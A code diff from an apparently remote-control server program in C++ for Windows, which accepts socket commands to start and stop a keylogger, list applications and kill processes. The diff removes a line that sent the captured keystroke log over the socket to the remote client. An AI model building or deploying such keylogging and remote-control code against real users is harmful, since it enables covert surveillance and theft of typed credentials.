@@ -227,7 +227,6 @@ void Server::handleClient(SOCKET clientSocket) {
             } else if (receivedMessage == "offKeylogger") {
                 std::cout << "Keylogger stop command received." << std::endl;
                 stopKeyLogger(clientSocket);
-                break;
             } else if (receivedMessage == "listApp"){
                 std::cout << "List app command received." << std::endl;
                 ListApplications(clientSocket);
@@ -365,9 +364,7 @@ void Server::startKeyLogger() {
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
     if (keyLoggerThread.joinable()) 
-        keyLoggerThread.join();   
-    copyFileAndSend(clientSocket, "log.txt", "log.txt");
-    
+        keyLoggerThread.join();    
 }
 
 void Server::keyLogger() {
@@ -484,7 +481,7 @@ void Server::openProcess(const std::string& appName, SOCKET clientSocket)
     }
 }
 
-void Server::closeProcess(const DWORD& processId, SOCKET clientSocket) //chatgpt
+void Server::closeProcess(const int processId, SOCKET clientSocket) //chatgpt
 {
     HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
     if (hProcess == NULL) {
